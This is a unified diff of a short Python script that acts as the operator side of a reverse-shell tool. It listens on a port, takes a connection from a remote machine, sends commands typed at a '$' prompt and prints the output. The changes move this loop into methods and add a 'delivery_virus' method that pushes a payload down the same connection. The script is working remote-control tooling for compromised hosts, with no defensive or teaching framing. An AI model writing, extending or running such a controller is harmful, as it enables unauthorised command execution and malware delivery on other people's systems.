@@ -1,5 +1,5 @@
 import socket, time
-import subprocess
+import socketserver
 
 class tunnel:
     
@@ -8,30 +8,34 @@ class tunnel:
         self.sock.bind((lhost,lport))
         self.sock.listen(5)
         print("listening on port {}".format(lport))
-        
         self.conn, self.addr = self.sock.accept()
+        self.conn.settimeout(1.0)
         print("connection from: {}",self.addr)
         
     def get_conn(self):
         return self.conn
     
+    def sent_command(self, command):
+        self.conn.send(command)
+        time.sleep(1)
+        
+    def get_response(self):
+        return self.conn.recv(1024).decode()
     
+    def delivery_virus(self, virus):
+        self.conn.sendall(virus)
+        
 
 c = tunnel()
-BUFFER_SIZE = 1024 * 128
-SEPARATOR = "<sep>"
+
 while True:
     try:
-        conn = c.get_conn()
-        command = input("$ ")
-        if command == "exit":
+        command = input("$ ").encode()
+        if command == b"exit":
             break
-        
-        command+="\n"
-        conn.send(command.encode())
-        time.sleep(1)
-        conn.settimeout(2.0)
-        response = conn.recv(BUFFER_SIZE).decode()
-        print(response)
+        command+=b"\n"
+        c.sent_command(command)
+        print(c.get_response())
     except TimeoutError as t:
         print("no Response")
+        
